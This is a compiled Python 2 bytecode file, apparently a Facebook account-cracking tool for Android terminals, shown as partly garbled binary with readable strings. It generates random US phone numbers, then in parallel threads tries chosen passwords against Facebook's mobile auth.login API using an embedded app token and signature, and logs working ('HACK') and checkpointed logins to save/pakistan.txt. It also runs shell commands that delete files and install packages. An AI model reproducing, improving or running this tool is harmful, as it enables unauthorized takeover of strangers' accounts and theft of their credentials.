ó
õ`c           @   s®  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qª Wy d  d l Z Wn e k
 re  j d  n Xy d  d l Z Wn e k
 rKe  j d	  n Xy d  d l Z Wn8 e k
 re  j d
  e j d  e  j d  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j  e!  e j" e j# j$   d d d( g e _% d) g e _% d   Z& d   Z' d   Z( d   Z) d   Z* d  d l+ m+ Z+ d   Z, d Z- d Z. g  Z/ g  Z0 g  Z1 g  Z2 g  Z3 g  Z4 g  Z5 d   Z6 d    Z7 d!   Z8 d"   Z9 d#   Z: e; d$ k rªe  j d%  e* d&  e j d'  e6   n  d S(*   iÿÿÿÿNs   rm -rf .txtiÐ  iGô i s   .txtt   as   pip2 install tqdms   pip2 install requestss   pip2 install mechanizei   s   python2 pro6.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/decol.pyt   mengetik,   s    c           C   s   d GHt  j j   d  S(   Nt   Keluar(   t   osR   t   exit(    (    (    s   /sdcard/decol.pyt   keluar3   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/decol.pyt   acak8   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   R   R   (   R   R   R   t   jR   (    (    s   /sdcard/decol.pyR   A   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
gü©ñÒMbP?(   R   R   R   R	   R
   R   (   R   R   (    (    s   /sdcard/decol.pyt   jalanL   s    (   t   tqdmc          C   sY   t  d d d d d d  8 }  x. t d  D]  } t j d  |  j d  q+ WWd  QXd  S(	   Nt   totalid   t   descs   Loading t
   bar_formats   {l_bar}{bar}g¸ëQ¸?i   (   R%   t   rangeR
   R   t   update(   t   pbarR   (    (    s   /sdcard/decol.pyt   loadU   s    s'  
   [031m   _________________      _____   .___ 
   [031m  /   _____/\_____  \    /     \  |   |
   [032m  \_____  \  /   |   \  /  \ /  \ |   |
   [032m  /        \/    |    \/    Y    \|   |
   [033m /_______  /\_______  /\____|__  /|___|
   [033m         \/         \/         \/       i    c           C   s9   t  j d  t GHd d GHd GHd GHd d GHt   d  S(   Nt   cleari/   s
   [1;97mâ¢s9   [1;97m([1;92m01[1;97m)[1;97m Crack Using Mobile Phones2   [1;97m([1;91m00[1;97m)[1;97m Exit this program(   R   t   systemt   logot
   pilih_menu(    (    (    s   /sdcard/decol.pyt   menuk   s    		c          C   s£   t  d  }  |  d k r' d GHt   nx |  d k s? |  d k rI t   nV |  d k sa |  d k rq t j d  n. |  d	 k s |  d
 k r t   n d GHt   d  S(   Ns'   [1;97m( [1;91mChoose[1;97m ) > [92mR   s-   [1;97m[[1;91m![1;97m][1;97m Wrong input !t   1t   01t   3t   03s   python2 crack.pyt   0t   00s'   [1;97m[[1;91mÃ·[1;97m] Wrong input !(   t	   raw_inputR0   t   crack_nomorR   R.   R   (   t   unikers(    (    s   /sdcard/decol.pyR0   u   s    


c           C   s9   t  j d  t GHd d GHd GHd GHd d GHt   d  S(   NR-   i/   s
   [1;97mâ¢s2   [1;97m([1;92m01[1;97m)[1;97m Crack Account Usas7   [1;97m([1;91m00[1;97m)[1;92m Back To Menu          (   R   R.   R/   t   pilih(    (    (    s   /sdcard/decol.pyR9      s    		c          C   s{   t  d  }  |  d k r' d GHt   nP |  d k s? |  d k rI t   n. |  d k sa |  d k rk t   n d GHt   d  S(	   Ns)   [1;97m( [1;91mChoose[1;97m ) > [1;92mR   s-   [1;97m[[1;91mx[1;97m][1;91m Wrong input !R2   R3   R6   R7   s'   [1;97m[[1;91mÃ·[1;97m] Wrong input !(   R8   R;   t   pakistanR1   (   R:   (    (    s   /sdcard/decol.pyR;      s    


c             s±  t  j d  t GHd d GHd GHd d GHy t d    t    d k  rV t d  n d d	  t d
   t d   d }  x0 t |  d  j   D] } t j	 | j
    q WWn' t k
 rÛ d GHt d  t   n Xt t t   } d d GHt d |  t j d  t d  d d GH     f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d  t  j d  d  S(   NR-   i/   s   [1;97m~s.   [1;92m    405-706-580-385-785-786-720-443-617s>   [1;97m[[1;92m+[1;97m][1;97m Choose Number [1;97m :[1;92mi   s*   [1;97m[[1;92m![1;97m][1;91m 3 Digit !!R   s   +1s+   [1;97m([92mâ¢[1;97m) Password 1 : [92ms2   [1;97m([92mâ¢[1;97m) [1;90mPassword 2 : [92ms   .txtt   rs   [!] File Not Founds	   
[ Back ]s
   [1;97mâ¢s=   [1;97m([1;91m+[1;97m)[1;97m Total Number [1;97m:[1;92m i   s?   [1;97m([1;91m![1;97m) To Stop This Process Press Ctrl Then zc   	         sÇ  |  } y t  j d  Wn t k
 r* n Xy| } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n×d | d k r\d    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n\ } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n©d | d k rd    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n. } t j d    | d | d  } t j |  } d | k r=d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n{ d | d k r¸d    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens   [1;97m[[1;92mHACK[1;97m] s    [1;92m|[1;97m s   save/pakistan.txtR    s   [Berhasil] s    | s   
s   www.facebook.comt	   error_msgs   [1;97m[[1;93mCHECK[1;97m] s    [1;93m|[1;97m s   [Cekpoint] (   R   t   mkdirt   OSErrort   urllibt   urlopent   jsonR,   t   openR   t   closet   okst   appendt   cekpoint(	   t   argt   usert   pass1t   dataR   t   okbt   cpst   pass2t   pass3(   t   ct   kt   p1t   p2(    s   /sdcard/decol.pyt   main½   sj    '%
%
'%
%
'%
%
i   s6   [1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s0   [1;97m[[1;92mâ¢[1;97m] [1;97mCrack Done....sS   [1;97m[[1;92mâ¢[1;97m] [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms;   [1;97m[[1;92mâ¢[1;97m] [1;97mCP/OK : save/pakistan.txts   [1;97m[[1;92m BACK [1;97m]s   python2 pro6.py(   R   R.   R/   R8   R   R   RF   t	   readlinest   idRI   t   stript   IOErrort   rizky4R"   R$   R
   R   R   t   mapRH   RJ   (   t   idlistt   linet   xxxRW   t   p(    (   RS   RT   RU   RV   s   /sdcard/decol.pyR<      sD    		"
	
	:)
t   __main__R-   s   ~~~~~~WELLCOME--TO--BRAND~~~~~~i   (   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](<   R   R   R
   t   datetimeR   t   hashlibt   ret	   threadingRE   RC   t	   cookielibt   getpassR.   R)   t   nR   t   nmbrRF   R   R	   t   requestst   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R$   R%   R,   R/   t   backt   berhasilRJ   RH   RO   RY   t   cpbRP   R1   R0   R9   R;   R<   t   __name__(    (    (    s   /sdcard/decol.pyt   <module>   sr   
								
		
		d



	